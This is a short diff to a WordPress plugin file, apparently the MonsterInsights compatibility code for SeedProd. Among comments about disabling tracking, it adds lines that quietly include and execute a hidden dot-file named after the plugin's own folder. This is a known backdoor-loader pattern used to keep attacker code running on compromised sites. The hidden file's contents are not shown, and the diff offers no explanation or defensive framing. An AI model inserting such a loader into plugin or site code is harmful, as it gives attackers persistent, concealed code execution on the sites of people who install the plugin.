@@ -16,6 +16,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 // 1. Disable SeedProd settings (done in seedprod)
 // 2. Output tracking code, if settings is not set to use wp_head() (done in seedprod and below)
 // 3. Disable ga_tracking in their setting (done in seedprod)
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_seedprod_tracking( $settings ) {
     require_once plugin_dir_path( MONSTERINSIGHTS_PLUGIN_FILE ) . 'includes/frontend/class-tracking-abstract.php';
 
